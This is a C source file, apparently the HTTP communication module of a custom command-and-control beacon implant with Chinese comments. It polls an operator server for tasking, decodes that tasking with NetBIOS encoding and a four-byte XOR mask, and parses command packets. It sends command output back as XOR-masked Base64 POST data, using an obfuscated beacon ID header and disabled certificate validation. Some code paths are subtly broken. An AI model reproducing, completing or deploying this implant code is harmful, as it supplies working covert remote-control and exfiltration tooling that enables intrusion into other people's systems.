#include "Http.h"
#include "Config.h"
#include "Util.h"

#define MAX_HEADER_SIZE 1024

unsigned char* removePrefixAndSuffix(unsigned char* data, unsigned char* prefix, unsigned char* suffix) {
    size_t prefixLen = strlen(prefix);
    size_t suffixLen = strlen(suffix);
    size_t dataLen = strlen(data);

    if (strncmp(data, prefix, prefixLen) == 0 &&
        strncmp(data + (dataLen - suffixLen), suffix, suffixLen) == 0) {
        data[dataLen - suffixLen] = '\0';
        return data + prefixLen;
    }

    return data; 
}

unsigned char* parseGetResponse(unsigned char* data, size_t dataSize ,size_t* responsedatalen) {
    //去除 data= 和 %%
    data = removePrefixAndSuffix(data, Response_prepend, Response_append);

    size_t data_length = strlen(data);
    unsigned char netbiosKey = 'a'; 
    size_t netbiosDecodeDataLen;

    // NetBIOS 解码
    unsigned char* netbiosDecodeData = NetbiosDecode((unsigned char*)data, data_length, netbiosKey ,&netbiosDecodeDataLen);

    // 错误，Mask密钥都存在四个字节
	// 如果小于5字节，说明数据有问题
    if (netbiosDecodeDataLen < 5) {
		*responsedatalen = 0;
        return NULL;
    }

    // Mask 解码，就是 XOR
    // 前四字节为 XOR 密钥
    unsigned char key[] = { netbiosDecodeData[0], netbiosDecodeData[1], netbiosDecodeData[2], netbiosDecodeData[3] };
    int key_length = sizeof(key) / sizeof(key[0]);
    size_t maskDecodeDataLen = netbiosDecodeDataLen - 4;
    unsigned char* maskDecodeData= MaskDecode((unsigned char*)&netbiosDecodeData[4], maskDecodeDataLen, key, key_length);

    // Mask解码后长度小于16字节，AES一组都不够，返回错误
    if (maskDecodeDataLen < 16) {
        *responsedatalen = 0;
        return NULL;
    }

    *responsedatalen = maskDecodeDataLen;

    return maskDecodeData;
}


unsigned char* parsePacket(unsigned char* decryptedBuf, uint32_t* totalLength, uint32_t* commandType ,size_t* commandBuflen, size_t* executeCount) {
    // 数据包格式：cmdType(4Bytes) | commandLen(4Bytes) | commandBuf || cmdType(4Bytes) | commandLen(4Bytes) | commandBuf(4Bytes) || ...

    // 没有足够的 cmdType + commandLen
    if (*totalLength < 8) {
        return NULL;
    }

    unsigned char* decryptedBuffer;

    if (*executeCount > 0) {

        decryptedBuffer = decryptedBuf + *executeCount;
    }
    else
    {
        decryptedBuffer = decryptedBuf;
    }

    uint8_t commandTypeBytes[4];
    unsigned char* commandTypeBytesStart = decryptedBuffer;
    memcpy(commandTypeBytes, commandTypeBytesStart, 4);
    *commandType = bigEndianUint32(commandTypeBytes);

    uint8_t commandLenBytes[4];
    unsigned char* commandLenBytesStart = decryptedBuffer + 4;
    memcpy(commandLenBytes, commandLenBytesStart, 4);
    uint32_t commandLen = bigEndianUint32(commandLenBytes);

	// 没有足够的 commandBuf
    if(*totalLength < (8 + commandLen)) {
        return NULL;
	}

    unsigned char* commandBuf = (unsigned char*)malloc(commandLen);
    if (commandBuf) {
        unsigned char* commandBufStart = decryptedBuffer + 8;
        memcpy(commandBuf, commandBufStart, commandLen);
    }

    // 留下剩下的数据包长度
    *totalLength = *totalLength - (4 + 4 + commandLen); 
    *commandBuflen = commandLen;                        

    *executeCount = *executeCount + commandLen + 8;

    return commandBuf;
}

unsigned char* GET(wchar_t* cookie_header, size_t* responseSize) {
    const int MAX_RETRY = 100;         
    const int RETRY_DELAY_MS = 5000; 

    int attempt = 0;
    while (attempt < MAX_RETRY) {
        attempt++;

        // 初始化 WinHttp 会话
        HINTERNET hSession = WinHttpOpen(NULL,
            WINHTTP_ACCESS_TYPE_DEFAULT_PROXY,
            WINHTTP_NO_PROXY_NAME,
            WINHTTP_NO_PROXY_BYPASS, 0);

        if (!hSession) {
            fprintf(stderr, "WinHttpOpen Failed (attempt %d): %lu\n", attempt, GetLastError());
            Sleep(RETRY_DELAY_MS);
            continue;
        }

        // 连接服务器
        HINTERNET hConnect = WinHttpConnect(hSession, server, port, 0);
        if (!hConnect) {
            fprintf(stderr, "WinHttpConnect Failed (attempt %d): %lu\n", attempt, GetLastError());
            WinHttpCloseHandle(hSession);
            Sleep(RETRY_DELAY_MS);
            continue;
        }

        HINTERNET hRequest = WinHttpOpenRequest(hConnect,
            L"GET", get_path, NULL, WINHTTP_NO_REFERER,
            WINHTTP_DEFAULT_ACCEPT_TYPES, 0);

        if (!hRequest) {
            fprintf(stderr, "WinHttpOpenRequest Failed (attempt %d): %lu\n", attempt, GetLastError());
            WinHttpCloseHandle(hConnect);
            WinHttpCloseHandle(hSession);
            Sleep(RETRY_DELAY_MS);
            continue;
        }

        // 添加请求头
        WinHttpAddRequestHeaders(hRequest, host_header, (DWORD)-1L, WINHTTP_ADDREQ_FLAG_ADD | WINHTTP_ADDREQ_FLAG_REPLACE);
        WinHttpAddRequestHeaders(hRequest, cookie_header, (DWORD)-1L, WINHTTP_ADDREQ_FLAG_ADD | WINHTTP_ADDREQ_FLAG_REPLACE);
        WinHttpAddRequestHeaders(hRequest, user_agent_header, (DWORD)-1L, WINHTTP_ADDREQ_FLAG_ADD | WINHTTP_ADDREQ_FLAG_REPLACE);

        // 发送请求
        if (!WinHttpSendRequest(hRequest, WINHTTP_NO_ADDITIONAL_HEADERS, 0,
            WINHTTP_NO_REQUEST_DATA, 0, 0, 0)) {
            fprintf(stderr, "WinHttpSendRequest Failed (attempt %d): %lu\n", attempt, GetLastError());
            WinHttpCloseHandle(hRequest);
            WinHttpCloseHandle(hConnect);
            WinHttpCloseHandle(hSession);
            Sleep(RETRY_DELAY_MS);
            continue;
        }

        // 接受响应
        if (!WinHttpReceiveResponse(hRequest, NULL)) {
            fprintf(stderr, "WinHttpReceiveResponse Failed (attempt %d): %lu\n", attempt, GetLastError());
            WinHttpCloseHandle(hRequest);
            WinHttpCloseHandle(hConnect);
            WinHttpCloseHandle(hSession);
            Sleep(RETRY_DELAY_MS);
            continue;
        }

        DWORD bytesRead = 0;
        unsigned char buffer[4096];
        unsigned char* responseData = NULL;
        size_t totalSize = 0;

        do {
            if (!WinHttpReadData(hRequest, buffer, sizeof(buffer), &bytesRead)) {
                fprintf(stderr, "WinHttpReadData Failed: %lu\n", GetLastError());
                free(responseData);
                responseData = NULL;
                break;
            }

            if (bytesRead > 0) {
                unsigned char* temp = realloc(responseData, totalSize + bytesRead);
                if (!temp) {
                    fprintf(stderr, "realloc failed\n");
                    free(responseData);
                    responseData = NULL;
                    break;
                }
                responseData = temp;
                memcpy(responseData + totalSize, buffer, bytesRead);
                totalSize += bytesRead;
            }
        } while (bytesRead > 0);

        *responseSize = totalSize;

        WinHttpCloseHandle(hRequest);
        WinHttpCloseHandle(hConnect);
        WinHttpCloseHandle(hSession);

        if (responseData) {
            return responseData; 
        }
        else {
            Sleep(RETRY_DELAY_MS);
        }
    }

    return NULL;
}

unsigned char* makeBeaconIdHeader() {
    // clientID为 100000-999998 之间的偶数
    DWORD digitCount = 6;  // clientID 位数

    // 加终止符 '\0'
    int charArrayLength = digitCount + 1;

    unsigned char* charId = (unsigned char*)malloc(charArrayLength);
    if (!charId) {
        fprintf(stderr, "Memory allocation failed for CharId\n");
        return NULL;
    }

    // 转化为字符串
    int rs = snprintf((unsigned char*)charId, charArrayLength, "%d", clientID);
    if (rs < 0 || rs >= charArrayLength) {
        fprintf(stderr, "String conversion failed for clientID: %d\n", clientID);
        free(charId);
        return NULL;
    }

    size_t codelen;

    // XOR
    // 返回二进制数据
    // 不用添加 \0
    unsigned char* MaskEncodeId = MaskEncode(charId, strlen(charId), &codelen);

    unsigned char netbiosKey = 'A'; 
    size_t NetbiosEncodeIdLen;

    // NetBios
    // 返回二进制数据
    // 不用添加 \0
    unsigned char* NetBoisId = NetbiosEncode(MaskEncodeId, codelen, netbiosKey, &NetbiosEncodeIdLen);

    unsigned char* header = "User:";
    unsigned char* result = (unsigned char*)malloc(NetbiosEncodeIdLen + strlen(header) + strlen(Http_post_id_prepend) + strlen(Http_post_id_append) + 1);

    // User:user=APNDCONJDOOBBMOKDPOB%%
    size_t offset = 0;
    memcpy(result + offset, header, strlen(header));
    offset += strlen(header);
    memcpy(result + offset, Http_post_id_prepend, strlen(Http_post_id_prepend));
    offset += strlen(Http_post_id_prepend);
    memcpy(result + offset, NetBoisId, NetbiosEncodeIdLen);
    offset += NetbiosEncodeIdLen;
    memcpy(result + offset, Http_post_id_append, strlen(Http_post_id_append));
    offset += strlen(Http_post_id_append);

    // 添加 '\0' 方便字符串处理
    result[offset] = '\0';

    free(MaskEncodeId);
    free(NetBoisId);
    free(charId);

    return result;
}

unsigned char* makePostData(unsigned char* postMsg, size_t msgLen, int callback) {
    size_t msg_length;
    unsigned char* finalPaket = MakePacket(callback, postMsg, msgLen, &msg_length);

    size_t code_length;
    // XOR
    unsigned char* MaskEncodedata = MaskEncode(finalPaket, msg_length, &code_length);
    // Base64
    unsigned char* data = base64Encode(MaskEncodedata, code_length);

    unsigned char* dataString = (unsigned char*)malloc(strlen(data) + strlen(Http_post_client_output_prepend) + strlen(Http_post_client_output_append) + 1);

    // data = post%%
    // strcat 会自动写入 \0
    if (dataString) {
        strcpy(dataString, Http_post_client_output_prepend);
        strcat(dataString, data);
        strcat(dataString, Http_post_client_output_append);
    }

    free(finalPaket);
    free(data);
	free(MaskEncodedata);
    return dataString;
}

BOOL POST(unsigned char* dataString, size_t dataSize, wchar_t* BeaconIdWideHeader) {
    // 初始化 WinHttp 会话
    HINTERNET hSession = WinHttpOpen(NULL,
        WINHTTP_ACCESS_TYPE_DEFAULT_PROXY,
        WINHTTP_NO_PROXY_NAME,
        WINHTTP_NO_PROXY_BYPASS, 0);
    if (!hSession) {
        fprintf(stderr, "WinHttpOpen Failed With Error: %lu\n", GetLastError());
        return FALSE;
    }

    // 连接到服务器
    HINTERNET hConnect = WinHttpConnect(hSession, server, port, 0);
    if (!hConnect) {
        fprintf(stderr, "WinHttpConnect Failed With Error: %lu\n", GetLastError());
        if (!WinHttpCloseHandle(hSession)) {
            fprintf(stderr, "WinHttpCloseHandle Failed With Error for hSession: %lu\n", GetLastError());
            return FALSE;
        }
        return FALSE;
    }

    // 创建 POST 请求
    HINTERNET hRequest = WinHttpOpenRequest(hConnect,
        L"POST",
        post_path,
        NULL,
        WINHTTP_NO_REFERER,
        WINHTTP_DEFAULT_ACCEPT_TYPES,
        0);
    if (!hRequest) {
        fprintf(stderr, "WinHttpOpenRequest Failed With Error: %lu\n", GetLastError());
        if (!WinHttpCloseHandle(hConnect)) {
            fprintf(stderr, "WinHttpCloseHandle Failed With Error for hConnect: %lu\n", GetLastError());
            return FALSE;
        }
        if (!WinHttpCloseHandle(hSession)) {
            fprintf(stderr, "WinHttpCloseHandle Failed With Error for hSession: %lu\n", GetLastError());
            return FALSE;
        }
        return FALSE;
    }

    WinHttpAddRequestHeaders(hRequest, BeaconIdWideHeader, (DWORD)-1L, WINHTTP_ADDREQ_FLAG_ADD | WINHTTP_ADDREQ_FLAG_REPLACE);
    WinHttpAddRequestHeaders(hRequest, host_header, (DWORD)-1L, WINHTTP_ADDREQ_FLAG_ADD | WINHTTP_ADDREQ_FLAG_REPLACE);
    WinHttpAddRequestHeaders(hRequest, user_agent_header, (DWORD)-1L, WINHTTP_ADDREQ_FLAG_ADD | WINHTTP_ADDREQ_FLAG_REPLACE);
    WinHttpAddRequestHeaders(hRequest, server_header, (DWORD)-1L, WINHTTP_ADDREQ_FLAG_ADD | WINHTTP_ADDREQ_FLAG_REPLACE);
    WinHttpAddRequestHeaders(hRequest, content_type_header, (DWORD)-1L, WINHTTP_ADDREQ_FLAG_ADD | WINHTTP_ADDREQ_FLAG_REPLACE);

    // 设置安全标志以忽略证书验证错误
    DWORD dwFlags = SECURITY_FLAG_IGNORE_UNKNOWN_CA |
        SECURITY_FLAG_IGNORE_CERT_CN_INVALID |
        SECURITY_FLAG_IGNORE_CERT_DATE_INVALID |
        SECURITY_FLAG_IGNORE_CERT_WRONG_USAGE;

    WinHttpSetOption(hRequest, WINHTTP_OPTION_SECURITY_FLAGS, &dwFlags, sizeof(dwFlags));

    // 发送 POST 请求，附带请求体数据
    if (!WinHttpSendRequest(hRequest,
        WINHTTP_NO_ADDITIONAL_HEADERS, 0, // 没有额外的请求头
        (LPVOID)dataString, dataSize,     // 请求体数据和长度
        dataSize,                         // 总数据长度
        0)) {
        fprintf(stderr, "WinHttpSendRequest Failed With Error: %lu\n", GetLastError());
        goto cleanup;
        return FALSE;
    }

cleanup:
    if (!WinHttpCloseHandle(hRequest)) {
        fprintf(stderr, "WinHttpCloseHandle Failed With Error for hRequest: %lu\n", GetLastError());
        return FALSE;
    }
    if (!WinHttpCloseHandle(hConnect)) {
        fprintf(stderr, "WinHttpCloseHandle Failed With Error for hConnect: %lu\n", GetLastError());
        return FALSE;
    }
    if (!WinHttpCloseHandle(hSession)) {
        fprintf(stderr, "WinHttpCloseHandle Failed With Error for hSession: %lu\n", GetLastError());
        return FALSE;
    }
}
